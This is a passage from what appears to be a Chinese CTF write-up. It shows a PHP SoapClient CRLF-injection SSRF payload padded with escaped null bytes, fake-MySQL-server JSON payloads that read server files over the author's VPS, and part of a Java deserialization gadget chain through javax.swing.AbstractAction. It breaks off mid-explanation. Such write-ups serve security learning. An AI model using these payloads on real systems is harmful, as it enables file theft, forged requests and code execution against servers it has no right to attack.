00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\r\\n--0f9486e921f5468f9ab50745c4c93267--\\r\\n&quot;;try &#123; $a = new SoapClient(null, array(&#x27;location&#x27; =&gt; &quot;http://127.0.0.1/siranai.php&quot;, &#x27;user_agent&#x27; =&gt; &quot;shanghe\\r\\n&quot; . &quot;Cookie: PHPSESSION=16aaab9fb\\r\\nContent-Type: multipart/form-data; boundary=&quot;.substr($postdata,2,32).&quot;\\r\\nConnection: keep-alive\\r\\nAccept: */*\\r\\nContent-Length: 10416&quot;.&quot;\\r\\n\\r\\n&quot;.$postdata, &#x27;uri&#x27; =&gt; &quot;http://127.0.0.1/siranai.php&quot;));&#125; catch (SoapFault $e) &#123;&#125;$b = new siroha();$b-&gt;koi=[&quot;zhanjiangdiyishenqing&quot;=&gt;[$a,&quot;nnnnn&quot;]];echo urlencode(serialize($b)); 这 nm 真抽象，👴搞出来，自己都绷不住了. 但是👴打进去，文件被替换，那种终出的感觉，真√⑧爽！！！1 # Ezfastjson shanhegiegie 出的黑盒 (大概) java, 刚好内容是我学过的，我可太喜欢了🥰🥰🥵 本地起个 msql_fake_server 1&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125; 读啥文件都行，除了 flag, 1&#123;&quot;host&quot;:&quot;vps:3307/test?user=fileread_netdoc:///app/ezfastjson-0.0.1-SNAPSHOT.jar&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;&#125; 源码鉴赏一波 你⛰🎁giegie 脑抽了 把 waf 写在了 parseObject 之后，那不直接打完反序列化漏洞再检测吗，跟没有一样. 所以可以直接打 JNDI, 不过这不是重点，重点是预期解，预期解的链子比较有意思. 这是黑名单，基本上是把 readobject 到 tostring 给 ban 了. 不过还有最终武器，👴马上就掏出来给你看看！！！ 就是 NEEPUCTF 中 Nomap 的那条链. # Nomap 调用链 1234javax.swing.AbstractAction#readObject -&gt; javax.swing.AbstractAction#putValue -&gt; javax.swing.AbstractAction#firePropertyChange -&gt; java.lang.Object#equals 这 beyond÷ 玩意需要重写 writeObject, 那么改 writeObject 方法比较多，但是 javassist 貌似用不了，需要使用 agent 去修改. 谁都没有想到，我们至尊的大 B 老师使用本地重新写个一模一样的类去修改，yahari, 高端的方法往往只需要朴素的操作.🤣 看看 javax.swing.AbstractAction#readObject # 写在前面 一条抽象的 equals 触发链 | Prove yourself (aecous.github.io) [NeepuCTF2023 公开赛 Writeup - Boogiepop Doesn’t Laugh (boogipop.com)](https://boogipop.com/2023/05/21/NeepuCTF2023 公开赛 Writeup/) 👴来看看怎么个事 # 调用链 1234javax.swing.AbstractAction#readObject -&gt; javax.swing.AbstractAction#putValue -&gt; javax.swing.AbstractAction#firePropertyChange -&gt; java.lang.Object#equals 这 beyond÷ 玩意需要重写 writeObject, 那么改 writeObject 方法比较多，但是 javassist 貌似用不了，需要使用 agent 去修改. 谁都没有想到，我们至尊的大 B 老师使用本地重新写个一模一样的类去修改，yahari, 高端的方法往往只需要朴素的操作.🤣 看看 javax.swing.AbstractAction#readObject 再看看 javax.swing.AbstractAction#putValue 触发 equals,equals 可以触发 Xstring 的 equals 从而调用任意 getters. 由于是抽象类，需要找到其子类 选择 AlignmentAction. # writeObject 